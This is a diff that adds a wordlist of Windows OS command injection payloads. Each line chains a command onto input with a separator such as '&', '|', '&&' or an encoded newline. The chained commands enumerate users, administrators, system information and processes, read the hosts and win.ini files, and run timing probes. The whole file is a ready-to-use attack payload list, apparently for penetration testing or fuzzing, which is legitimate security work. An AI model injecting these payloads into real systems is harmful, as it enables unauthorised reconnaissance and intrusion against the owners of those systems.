@@ -1,0 +1,31 @@
+# Command Injection - Windows
+# Payloads for OS command injection on Windows systems
+& dir
+& whoami
+& ipconfig
+& net user
+& net localgroup administrators
+& systeminfo
+& type C:\Windows\System32\drivers\etc\hosts
+& type C:\Windows\win.ini
+| dir
+| whoami
+| ipconfig
+| net user
+|| dir
+|| whoami
+|| ipconfig
+&& dir
+&& whoami
+&& ipconfig
+; dir
+; whoami
+%0adir
+%0awhoami
+& ping -n 5 127.0.0.1
+& timeout /t 5
+| timeout /t 5
+& tasklist
+& set
+& echo %USERNAME%
+& echo %COMPUTERNAME%
